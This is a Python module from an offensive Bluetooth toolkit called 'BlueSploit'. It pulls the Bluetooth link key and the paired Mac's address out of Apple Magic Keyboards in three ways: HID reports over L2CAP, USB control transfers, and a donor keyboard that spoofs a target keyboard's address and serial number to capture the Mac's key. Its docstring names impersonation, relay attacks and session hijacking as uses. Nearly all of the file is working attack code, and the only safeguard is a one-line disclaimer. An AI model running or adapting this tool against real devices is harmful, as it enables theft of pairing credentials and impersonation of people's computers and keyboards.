"""
BlueSploit Post-Exploitation: Apple Magic Keyboard Link Key Extraction

Reads the Bluetooth link key from a paired Apple Magic Keyboard via three
distinct paths. The link key + paired-Mac BD_ADDR are stored in HID feature
reports 0x34 (keyboard identity) and 0x35 (Mac identity + 16-byte LTK).

Once extracted, the link key allows full impersonation of the Mac to the
keyboard (or vice versa) on a separate adapter, useful for relay attacks,
session hijacking, and offline analysis of pairing material.

Three modes:
  bluetooth, Connect L2CAP HID PSM 17 to keyboard, read reports 0x34/0x35
              over the HID Control channel (no USB cable required, but
              keyboard must be in pairing mode or already paired with us)

  usb      , Apple Magic Keyboard plugged in via USB to attacker host.
              Read reports via USB control transfers (idVendor=0x05ac).
              Yields paired Mac's BD_ADDR + link key without any Bluetooth.

  usb_donor, Use a separate "donor" Magic Keyboard plugged into attacker.
              Spoof its serial-number string descriptor + report 0x34
              (keyboard BD_ADDR) to match the target keyboard, plug into
              target Mac so the Mac stores its link key in the donor,
              then plug donor back to read the captured link key.
              (Yields the Mac's link key for an arbitrary keyboard BD_ADDR.)

Mirrors marcnewlin/hi_my_name_is_keyboard:
  - read-link-key-via-bluetooth.py
  - read-link-key-via-usb.py
  - read-link-key-from-mac.py

Requires: root (Bluetooth modes), pyusb (USB modes), pybluez (BT mode)
"""

import binascii
import os
import re
import struct
import subprocess
import time
from typing import Dict, Optional
from core.base import AuxiliaryModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    PYBLUEZ_AVAILABLE = True
except ImportError:
    PYBLUEZ_AVAILABLE = False

try:
    import usb.core
    import usb.util
    PYUSB_AVAILABLE = True
except ImportError:
    PYUSB_AVAILABLE = False


APPLE_VENDOR_ID = 0x05ac
PSM_HID_CONTROL = 0x0011
PSM_HID_INTERRUPT = 0x0013

NULL_LINK_KEY = "00" * 16


class Module(AuxiliaryModule):
    """
    Apple Magic Keyboard Link Key Extraction (Bluetooth + USB paths)

    Recovers the BT link key + paired Mac BD_ADDR from HID feature
    reports 0x34/0x35 on Apple Magic Keyboards via Bluetooth or USB.
    """

    info = ModuleInfo(
        name="Apple Magic Keyboard Link Key Extraction",
        description=(
            "Extract paired BT link key from Apple Magic Keyboard via L2CAP "
            "HID, USB control transfers, or USB donor-spoof against a Mac"
        ),
        author=["BlueSploit"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        cve=None,
        references=[
            "https://github.com/marcnewlin/hi_my_name_is_keyboard",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="mode",
            required=True,
            description="Mode: bluetooth, usb, usb_donor",
            default="usb",
        ))
        self.add_option(ModuleOption(
            name="keyboard_addr",
            required=False,
            description="Magic Keyboard BD_ADDR (bluetooth mode)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="target_keyboard_addr",
            required=False,
            description="Target keyboard BD_ADDR to spoof on donor (usb_donor mode)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="target_serial",
            required=False,
            description="17-char keyboard serial to spoof (usb_donor mode)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="output_file",
            required=False,
            description="Save extracted credentials to JSON",
            default=None,
        ))

    def check(self) -> bool:
        mode = (self.get_option("mode") or "usb").lower()
        if mode not in ("bluetooth", "usb", "usb_donor"):
            print_error(f"Invalid mode: {mode}")
            return False
        if mode == "bluetooth":
            if not PYBLUEZ_AVAILABLE:
                print_error("pybluez required, run install.sh --classic")
                return False
            if not self.validate_bd_addr(self.get_option("keyboard_addr") or ""):
                print_error("bluetooth mode requires keyboard_addr")
                return False
        if mode in ("usb", "usb_donor"):
            if not PYUSB_AVAILABLE:
                print_error("pyusb required, pip install pyusb")
                return False
        if mode == "usb_donor":
            kb = self.get_option("target_keyboard_addr")
            sn = self.get_option("target_serial")
            if not (kb and self.validate_bd_addr(kb)):
                print_error("usb_donor needs target_keyboard_addr (BD_ADDR)")
                return False
            if not sn or not re.match(r"^[A-Z0-9]{17}$", sn):
                print_error("usb_donor needs target_serial (17 chars, A-Z0-9)")
                return False
        return True

    def run(self) -> bool:
        if not self.check():
            return False
        mode = (self.get_option("mode") or "usb").lower()

        C = Colors
        print(f"\n  {C.RED}╔{'═'*60}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}Apple Magic Keyboard Link Key Extraction ({mode}){C.RESET}            {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")

        print_info(f"Mode : {mode}")
        print_warning("DISCLAIMER: For authorized security testing only!")

        if mode == "bluetooth":
            return self._run_bluetooth()
        if mode == "usb":
            return self._run_usb()
        if mode == "usb_donor":
            return self._run_usb_donor()
        return False

    # ── Bluetooth path ──────────────────────────────────────────────────────

    def _run_bluetooth(self) -> bool:
        if os.geteuid() != 0:
            print_error("Root required for raw L2CAP")
            return False

        kb_addr = self.get_option("keyboard_addr")
        print_info(f"Connecting to keyboard {kb_addr} on HID PSMs...")

        c17 = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        c19 = bluetooth.BluetoothSocket(bluetooth.L2CAP)

        try:
            c17.settimeout(10)
            c19.settimeout(10)

            for attempt in range(15):
                try:
                    c17.connect((kb_addr, PSM_HID_CONTROL))
                    print_success("Connected HID Control (PSM 17)")
                    break
                except Exception:
                    time.sleep(0.5)
            else:
                print_error("Could not connect HID Control")
                return False

            try:
                c19.connect((kb_addr, PSM_HID_INTERRUPT))
                print_success("Connected HID Interrupt (PSM 19)")
            except Exception as e:
                print_warning(f"HID Interrupt: {e}, proceeding")

            # Read HID report 0x34 (keyboard identity)
            res34 = self._read_hid_report_l2cap(c17, 0x34)
            if not res34:
                print_error("Failed to read report 0x34")
                return False
            accessory_addr = ":".join(f"{b:02x}" for b in res34[6:12])
            try:
                accessory_model = bytes(res34[15:]).decode("utf-8", errors="ignore").strip()
            except Exception:
                accessory_model = "?"

            # Read HID report 0x35 (Mac identity + link key)
            res35 = self._read_hid_report_l2cap(c17, 0x35)
            if not res35:
                print_error("Failed to read report 0x35")
                return False
            mac_addr = ":".join(f"{b:02x}" for b in res35[5:11])
            link_key = binascii.hexlify(bytes(res35[11:27])[::-1]).decode()

            self._print_results(accessory_model, accessory_addr, mac_addr, link_key)
            self._save_results(accessory_model, accessory_addr, mac_addr, link_key)
            return link_key != NULL_LINK_KEY

        finally:
            try: c17.close()
            except Exception: pass
            try: c19.close()
            except Exception: pass

    def _read_hid_report_l2cap(self, c17, report_id: int) -> Optional[bytes]:
        """L2CAP HID Get_Report dance, request, ACK, receive."""
        try:
            c17.send(bytes([0x53, 0xFF, report_id]))
            c17.settimeout(1)
            c17.recv(1024)
            c17.send(bytes([0x43, 0xF0]))
            return c17.recv(1024)
        except Exception as e:
            print_warning(f"HID report {report_id:#x} read: {e}")
            return None

    # ── USB path (direct read) ──────────────────────────────────────────────

    def _run_usb(self) -> bool:
        print_info(f"Looking for Apple Magic Keyboard (vendor 0x{APPLE_VENDOR_ID:04X})...")
        dev = usb.core.find(idVendor=APPLE_VENDOR_ID)
        if dev is None:
            print_error("No Apple USB device found")
            print_info("Plug an Apple Magic Keyboard into this machine via USB")
            return False
        print_success(f"Found Apple device: bus {dev.bus} addr {dev.address}")

        # Detach kernel driver from interfaces
        for x in range(4):
            try:
                if dev.is_kernel_driver_active(x):
                    dev.detach_kernel_driver(x)
            except Exception:
                pass

        try:
            # Read serial number string descriptor (string idx 3)
            res_sn = dev.ctrl_transfer(0x80, 0x06, 0x0303, 0x0000, 0x100)
            serial_number = bytes(res_sn[::2][1:]).decode("utf-8", errors="ignore")

            # HID report 0x34, keyboard identity
            res34 = dev.ctrl_transfer(0xa1, 0x01, 0x0334, 0x0000, 0x100)
            accessory_addr = ":".join(f"{b:02x}" for b in res34[4:10])
            accessory_model = bytes(res34[13:]).decode("utf-8", errors="ignore").strip()

            # HID report 0x35, Mac identity + link key
            res35 = dev.ctrl_transfer(0xa1, 0x01, 0x0335, 0x0000, 0x100)
            mac_addr = ":".join(f"{b:02x}" for b in res35[3:9])
            link_key = binascii.hexlify(bytes(res35[9:25])[::-1]).decode()

            self._print_results(accessory_model, accessory_addr, mac_addr,
                                link_key, serial_number)
            self._save_results(accessory_model, accessory_addr, mac_addr,
                               link_key, serial_number)

            if link_key == NULL_LINK_KEY:
                print_warning("Link key is all-zeros, keyboard hasn't been paired with a Mac yet")
                print_info("Plug into a Mac for ~5s, then back here and re-run")
                return False
            return True

        except Exception as e:
            print_error(f"USB ctrl transfer failed: {e}")
            return False

    # ── USB donor-spoof path ────────────────────────────────────────────────

    def _run_usb_donor(self) -> bool:
        kb_addr = self.get_option("target_keyboard_addr")
        serial = self.get_option("target_serial")

        print_warning("USB donor mode requires:")
        print_info("  1. Apple Magic Keyboard plugged into THIS machine")
        print_info("  2. Target Mac available to plug donor into briefly")
        print_info("  3. Donor returned here after Mac visit")
        print_info("")
        print_info(f"Will spoof donor identity → BD_ADDR={kb_addr} serial={serial}")

        if input("Proceed? (y/N): ").strip().lower() != "y":
            print_info("Aborted by user")
            return False

        # Step 1: locate donor
        print_info("\n[1/5] Waiting for donor keyboard to appear on USB...")
        while usb.core.find(idVendor=APPLE_VENDOR_ID) is None:
            time.sleep(0.2)
        dev = usb.core.find(idVendor=APPLE_VENDOR_ID)
        for x in range(8):
            try:
                if dev.is_kernel_driver_active(x):
                    dev.detach_kernel_driver(x)
            except Exception:
                pass
        dev.set_configuration(1)
        print_success("Donor keyboard detected")

        # Step 2: rewrite report 0x34 with target BD_ADDR
        print_info("[2/5] Rewriting HID report 0x34 with target keyboard BD_ADDR...")
        report = bytes(dev.ctrl_transfer(0xa1, 0x01, 0x0334, 0x0000, 0x1000))
        new_addr_bytes = binascii.unhexlify(kb_addr.replace(":", ""))
        new_report = report[:4] + new_addr_bytes + report[10:]
        try:
            dev.ctrl_transfer(0x21, 0x09, 0x0334, 0x0000, new_report)
            print_success("Report 0x34 rewritten")
        except Exception as e:
            print_error(f"Report write failed: {e}")
            return False

        # Step 3: rewrite serial number
        print_info("[3/5] Rewriting USB serial number string descriptor...")
        sn_bytes = serial.encode()
        if len(sn_bytes) < 32:
            sn_bytes += b"\x00" * (32 - len(sn_bytes))
        desc = b"\x03"
        for c in sn_bytes:
            desc += bytes([c, 0])
        desc = bytes([len(desc) + 101]) + desc
        if 32 > len(desc):
            desc += b"\x00" * (32 - len(desc))
        try:
            dev.ctrl_transfer(0x00, 0x06, 0x0303, 0x0000, desc)
            print_success("Serial number rewritten")
        except Exception as e:
            print_warning(f"Serial rewrite: {e}")

        # Step 4: ask user to plug into target Mac
        print_warning("\n" + "─" * 70)
        print_warning("USER ACTION: unplug donor, plug into target Mac.")
        print_warning("Wait ~5s, then unplug and bring back here.")
        print_warning("─" * 70)
        print_info("[4/5] Waiting for donor to be unplugged...")
        while usb.core.find(idVendor=APPLE_VENDOR_ID) is not None:
            time.sleep(0.1)
        print_success("Donor unplugged")

        print_info("Waiting for donor to return to this machine...")
        while usb.core.find(idVendor=APPLE_VENDOR_ID) is None:
            time.sleep(0.1)
        time.sleep(1)
        dev = usb.core.find(idVendor=APPLE_VENDOR_ID)
        for x in range(8):
            try:
                if dev.is_kernel_driver_active(x):
                    dev.detach_kernel_driver(x)
            except Exception:
                pass
        dev.set_configuration(1)
        print_success("Donor returned")

        # Step 5: read report 0x35
        print_info("[5/5] Reading captured Mac link key from report 0x35...")
        try:
            report = bytes(dev.ctrl_transfer(0xa1, 0x01, 0x0335, 0x0000, 0x1000))
        except Exception as e:
            print_error(f"Report read failed: {e}")
            return False

        mac_addr = ":".join(f"{b:02x}" for b in report[3:9])
        link_key = binascii.hexlify(report[9:25][::-1]).decode()

        if link_key == NULL_LINK_KEY:
            print_warning("Link key is all-zeros, Mac may not have stored it yet")
            print_info("Try plugging into Mac for longer (10s+), or pair manually first")
            return False

        self._print_results("(donor)", kb_addr, mac_addr, link_key, serial)
        self._save_results("(donor)", kb_addr, mac_addr, link_key, serial)
        return True

    # ── Output ──────────────────────────────────────────────────────────────

    def _print_results(self, model: str, accessory_addr: str,
                       mac_addr: str, link_key: str,
                       serial: Optional[str] = None) -> None:
        C = Colors
        print(f"\n  {C.GREEN}{'━' * 60}{C.RESET}")
        print(f"  {C.BOLD}EXTRACTED CREDENTIALS{C.RESET}")
        print(f"  {C.GREEN}{'━' * 60}{C.RESET}")
        print(f"    Model         : {model}")
        if serial:
            print(f"    Serial        : {serial}")
        print(f"    Keyboard BD   : {accessory_addr}")
        print(f"    Paired Mac BD : {mac_addr}")
        print(f"    Link Key      : {link_key}")
        print(f"  {C.GREEN}{'━' * 60}{C.RESET}\n")

    def _save_results(self, model: str, accessory_addr: str,
                      mac_addr: str, link_key: str,
                      serial: Optional[str] = None) -> None:
        out_path = self.get_option("output_file")
        result = {
            "model": model,
            "serial": serial,
            "keyboard_bdaddr": accessory_addr,
            "paired_mac_bdaddr": mac_addr,
            "link_key": link_key,
        }
        self.add_result(result)

        if out_path:
            import json
            try:
                with open(out_path, "w") as f:
                    json.dump(result, f, indent=2)
                print_success(f"Saved to {out_path}")
            except OSError as e:
                print_error(f"Cannot write {out_path}: {e}")
